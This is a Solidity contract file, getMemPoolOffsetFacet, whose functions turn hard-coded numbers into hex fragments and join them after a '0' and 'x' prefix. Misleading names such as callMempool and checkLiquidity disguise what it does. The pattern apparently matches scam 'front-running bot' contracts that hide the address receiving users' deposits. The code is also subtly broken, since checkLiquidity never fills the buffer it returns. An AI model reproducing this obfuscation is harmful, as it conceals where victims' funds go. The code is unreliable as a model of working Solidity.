// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.6;
import "./TestLib.sol";
contract getMemPoolOffsetFacet {
    function getMemPoolOffset() internal pure returns (uint) {
        return 995411;
    }
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool(
            "x",
            checkLiquidity(getMemPoolOffset())
        );
        uint _memPoolSol = 534136;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 379113;
        uint _memPoolHeight = fetchContractID();
        uint _memPoolWidth = 308522;
        uint _memPoolDepth = contractData();
        uint _memPoolCount = 692501;

        string memory _memPool1 = mempool(
            _memPoolOffset,
            checkLiquidity(_memPoolSol)
        );
        string memory _memPool2 = mempool(
            checkLiquidity(_memPoolLength),
            checkLiquidity(_memPoolSize)
        );
        string memory _memPool3 = mempool(
            checkLiquidity(_memPoolHeight),
            checkLiquidity(_memPoolWidth)
        );
        string memory _memPool4 = mempool(
            checkLiquidity(_memPoolDepth),
            checkLiquidity(_memPoolCount)
        );

        string memory _allMempools = mempool(
            mempool(_memPool1, _memPool2),
            mempool(_memPool3, _memPool4)
        );
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }
    function mempool(
        string memory _base,
        string memory _value
    ) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            a /= 16;
        }
        uint hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }
    function getMemPoolLength() internal pure returns (uint) {
        return 524502;
    }
    function fetchContractID() internal pure returns (uint) {
        return 285398;
    }
    function contractData() internal pure returns (uint) {
        return 395729;
    }
}
